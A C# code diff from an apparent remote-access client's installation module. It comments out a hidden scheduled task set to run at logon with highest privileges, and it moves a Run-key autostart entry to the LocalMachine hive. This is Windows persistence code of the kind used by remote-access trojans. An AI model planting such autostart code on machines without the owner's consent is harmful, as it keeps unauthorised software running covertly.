@@ -13,24 +13,26 @@ namespace xClient.Core.Installation
         {
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
-                try
-                {
-                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                    {
-                        Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + ClientData.CurrentPath + "\" /rl HIGHEST /f",
-                        UseShellExecute = false,
-                        CreateNoWindow = true
-                    };
+                // Don't schedule non-working task on startup
 
-                    Process p = Process.Start(startInfo);
-                    p.WaitForExit(1000);
-                    if (p.ExitCode == 0) return true;
-                }
-                catch (Exception)
-                {
-                }
+                //try
+                //{
+                //    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                //    {
+                //        Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + ClientData.CurrentPath + "\" /rl HIGHEST /f",
+                //        UseShellExecute = false,
+                //        CreateNoWindow = true
+                //    };
 
-                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
+                //    Process p = Process.Start(startInfo);
+                //    p.WaitForExit(1000);
+                //    if (p.ExitCode == 0) return true;
+                //}
+                //catch (Exception)
+                //{
+                //}
+
+                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                     true);
             }
@@ -46,24 +48,24 @@ namespace xClient.Core.Installation
         {
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
-                try
-                {
-                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                    {
-                        Arguments = "/delete /tn \"" + Settings.STARTUPKEY + "\" /f",
-                        UseShellExecute = false,
-                        CreateNoWindow = true
-                    };
+                //try
+                //{
+                //    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                //    {
+                //        Arguments = "/delete /tn \"" + Settings.STARTUPKEY + "\" /f",
+                //        UseShellExecute = false,
+                //        CreateNoWindow = true
+                //    };
 
-                    Process p = Process.Start(startInfo);
-                    p.WaitForExit(1000);
-                    if (p.ExitCode == 0) return true;
-                }
-                catch (Exception)
-                {
-                }
+                //    Process p = Process.Start(startInfo);
+                //    p.WaitForExit(1000);
+                //    if (p.ExitCode == 0) return true;
+                //}
+                //catch (Exception)
+                //{
+                //}
 
-                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
+                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
             }
             else
